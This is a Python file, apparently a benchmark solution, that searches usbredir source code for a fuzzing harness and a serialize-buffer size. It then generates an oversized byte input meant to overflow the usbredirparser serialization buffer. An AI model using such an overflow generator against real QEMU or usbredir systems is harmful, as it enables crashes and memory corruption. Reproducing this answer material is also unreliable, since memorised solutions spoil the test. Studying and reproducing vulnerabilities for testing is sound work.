import os
import re
import tarfile
import ast
from typing import Iterator, Optional, Tuple


class _SafeEval(ast.NodeVisitor):
    __slots__ = ("ok",)

    def __init__(self):
        self.ok = True

    def visit(self, node):
        if not self.ok:
            return None
        return super().visit(node)

    def generic_visit(self, node):
        self.ok = False
        return None

    def visit_Expression(self, node: ast.Expression):
        return self.visit(node.body)

    def visit_Constant(self, node: ast.Constant):
        if isinstance(node.value, (int, float)):
            return int(node.value)
        self.ok = False
        return None

    def visit_UnaryOp(self, node: ast.UnaryOp):
        v = self.visit(node.operand)
        if not self.ok:
            return None
        if isinstance(node.op, ast.UAdd):
            return +v
        if isinstance(node.op, ast.USub):
            return -v
        if isinstance(node.op, ast.Invert):
            return ~v
        self.ok = False
        return None

    def visit_BinOp(self, node: ast.BinOp):
        a = self.visit(node.left)
        b = self.visit(node.right)
        if not self.ok:
            return None
        op = node.op
        try:
            if isinstance(op, ast.Add):
                return a + b
            if isinstance(op, ast.Sub):
                return a - b
            if isinstance(op, ast.Mult):
                return a * b
            if isinstance(op, ast.FloorDiv):
                return a // b
            if isinstance(op, ast.Div):
                return a // b
            if isinstance(op, ast.Mod):
                return a % b
            if isinstance(op, ast.LShift):
                return a << b
            if isinstance(op, ast.RShift):
                return a >> b
            if isinstance(op, ast.BitOr):
                return a | b
            if isinstance(op, ast.BitAnd):
                return a & b
            if isinstance(op, ast.BitXor):
                return a ^ b
        except Exception:
            self.ok = False
            return None
        self.ok = False
        return None

    def visit_Paren(self, node):
        return self.visit(node)


def _safe_int_expr(expr: str) -> Optional[int]:
    expr = expr.strip()
    if not expr:
        return None
    expr = re.sub(r"(/\*.*?\*/)", "", expr, flags=re.S)
    expr = re.sub(r"(//.*)$", "", expr, flags=re.M).strip()
    expr = re.sub(r"\b([0-9]+)(?:U|UL|ULL|L|LL)\b", r"\1", expr)
    expr = re.sub(r"\b(0x[0-9a-fA-F]+)(?:U|UL|ULL|L|LL)\b", r"\1", expr)
    if re.search(r"[A-Za-z_]", expr):
        return None
    try:
        tree = ast.parse(expr, mode="eval")
    except Exception:
        return None
    ev = _SafeEval()
    val = ev.visit(tree)
    if not ev.ok:
        return None
    try:
        return int(val)
    except Exception:
        return None


def _iter_source_texts(src_path: str) -> Iterator[Tuple[str, str]]:
    def should_consider(name: str) -> bool:
        low = name.lower()
        if not (low.endswith(".c") or low.endswith(".h") or low.endswith(".cc") or low.endswith(".cpp")):
            return False
        if any(x in low for x in ("usbredir", "fuzz", "parser", "serialize", "migration", "qemu")):
            return True
        return False

    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                p = os.path.join(root, fn)
                rel = os.path.relpath(p, src_path)
                if not should_consider(rel):
                    continue
                try:
                    st = os.stat(p)
                except OSError:
                    continue
                if st.st_size > 2_500_000:
                    continue
                try:
                    with open(p, "rb") as f:
                        data = f.read()
                except OSError:
                    continue
                try:
                    txt = data.decode("utf-8", "ignore")
                except Exception:
                    txt = data.decode("latin1", "ignore")
                yield rel, txt
        return

    if not tarfile.is_tarfile(src_path):
        return

    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf:
                if not m.isreg():
                    continue
                name = m.name
                if not should_consider(name):
                    continue
                if m.size > 2_500_000:
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                except Exception:
                    continue
                try:
                    txt = data.decode("utf-8", "ignore")
                except Exception:
                    txt = data.decode("latin1", "ignore")
                yield name, txt
    except Exception:
        return


def _find_serialize_buf_size(src_path: str) -> int:
    define_re = re.compile(r"^\s*#\s*define\s+USBREDIRPARSER_SERIALIZE_BUF_SIZE\s+(.+?)\s*$", re.M)
    for _, txt in _iter_source_texts(src_path):
        m = define_re.search(txt)
        if not m:
            continue
        expr = m.group(1)
        val = _safe_int_expr(expr)
        if val is None:
            continue
        if 1024 <= val <= 4 * 1024 * 1024:
            return int(val)
    return 64 * 1024


def _pick_harness(src_path: str) -> Optional[Tuple[str, str]]:
    candidates = []
    for name, txt in _iter_source_texts(src_path):
        if "LLVMFuzzerTestOneInput" in txt or "LLVMFuzzerInitialize" in txt:
            score = 0
            low = txt.lower()
            if "usbredir" in low:
                score += 5
            if "serialize" in low:
                score += 3
            if "usbredirparser" in low:
                score += 4
            if "do_write" in low or "write(" in low:
                score += 1
            candidates.append((score, name, txt))
    if not candidates:
        return None
    candidates.sort(key=lambda x: (-x[0], x[1]))
    _, name, txt = candidates[0]
    return name, txt


def _detect_mode(harness_txt: str) -> Tuple[str, str]:
    low = harness_txt.lower()

    if "fuzzeddataprovider" in low and ("consumeremainingbytes" in low or "consume_bytes" in low):
        return "raw", "le"

    raw_write_re = re.compile(
        r"\busbredirparser_(?:do_)?write\s*\(\s*[^,]+,\s*(?:\([^)]*\)\s*)?\bdata\b\s*,\s*(?:\([^)]*\)\s*)?\bsize\b\s*\)",
        re.I | re.S,
    )
    if raw_write_re.search(harness_txt):
        return "raw", "le"

    endian = "le"
    if any(x in low for x in ("ntohs", "be16toh", "be32toh", "big_endian", "from_be", "to_be")):
        endian = "be"

    call_re = re.compile(r"\busbredirparser_(?:do_)?write\s*\(\s*([^;]*?)\)", re.I | re.S)
    for cm in call_re.finditer(harness_txt):
        call_args = cm.group(1)
        args = [a.strip() for a in call_args.split(",")]
        if len(args) < 3:
            continue
        length_arg = args[2]
        var_m = re.match(r"^([A-Za-z_][A-Za-z0-9_]*)$", length_arg)
        if not var_m:
            continue
        var = var_m.group(1)
        decl_m = re.search(rf"\buint(8|16|32)_t\s+{re.escape(var)}\b", harness_txt)
        if decl_m:
            bits = int(decl_m.group(1))
            return f"u{bits}_len_blocks", endian

    if re.search(r"\buint16_t\b.*\blen\b", harness_txt) and re.search(r"\busbredirparser_(?:do_)?write\b", harness_txt):
        return "u16_len_blocks", endian
    if re.search(r"\buint32_t\b.*\blen\b", harness_txt) and re.search(r"\busbredirparser_(?:do_)?write\b", harness_txt):
        return "u32_len_blocks", endian

    return "raw", endian


def _pack_u16(v: int, endian: str) -> bytes:
    v &= 0xFFFF
    if endian == "be":
        return bytes([(v >> 8) & 0xFF, v & 0xFF])
    return bytes([v & 0xFF, (v >> 8) & 0xFF])


def _pack_u32(v: int, endian: str) -> bytes:
    v &= 0xFFFFFFFF
    if endian == "be":
        return bytes([(v >> 24) & 0xFF, (v >> 16) & 0xFF, (v >> 8) & 0xFF, v & 0xFF])
    return bytes([v & 0xFF, (v >> 8) & 0xFF, (v >> 16) & 0xFF, (v >> 24) & 0xFF])


def _gen_raw(total_len: int) -> bytes:
    if total_len <= 0:
        return b""
    ba = bytearray(b"A" * total_len)
    ba[0:1] = b"\x00"
    return bytes(ba)


def _gen_u8_blocks(buf_target: int, extra: int) -> bytes:
    payload_target = buf_target + extra
    chunk = 250
    n = (payload_target + chunk - 1) // chunk
    ba = bytearray()
    payload_byte = 0x41
    for i in range(n):
        ba.append(chunk)
        ba.extend(bytes([payload_byte]) * chunk)
        payload_byte = (payload_byte + 1) & 0xFF
        if payload_byte == 0:
            payload_byte = 1
    if ba:
        ba[0] = chunk
    return bytes(ba)


def _gen_u16_blocks(buf_target: int, extra: int, endian: str) -> bytes:
    payload_target = buf_target + extra
    chunk = 2048
    n = (payload_target + chunk - 1) // chunk
    ba = bytearray()
    payload_byte = 0x41
    for _ in range(n):
        ba.extend(_pack_u16(chunk, endian))
        ba.extend(bytes([payload_byte]) * chunk)
        payload_byte = (payload_byte + 1) & 0xFF
        if payload_byte == 0:
            payload_byte = 1
    return bytes(ba)


def _gen_u32_blocks(buf_target: int, extra: int, endian: str) -> bytes:
    payload_target = buf_target + extra
    chunk = 8192
    n = (payload_target + chunk - 1) // chunk
    ba = bytearray()
    payload_byte = 0x41
    for _ in range(n):
        ba.extend(_pack_u32(chunk, endian))
        ba.extend(bytes([payload_byte]) * chunk)
        payload_byte = (payload_byte + 1) & 0xFF
        if payload_byte == 0:
            payload_byte = 1
    return bytes(ba)


class Solution:
    def solve(self, src_path: str) -> bytes:
        buf_size = _find_serialize_buf_size(src_path)
        extra = 5000

        harness = _pick_harness(src_path)
        if harness is None:
            return _gen_raw(buf_size + extra)

        _, htxt = harness
        mode, endian = _detect_mode(htxt)

        if mode == "u8_len_blocks":
            return _gen_u8_blocks(buf_size, extra)
        if mode == "u16_len_blocks":
            return _gen_u16_blocks(buf_size, extra, endian)
        if mode == "u32_len_blocks":
            return _gen_u32_blocks(buf_size, extra, endian)
        return _gen_raw(buf_size + extra)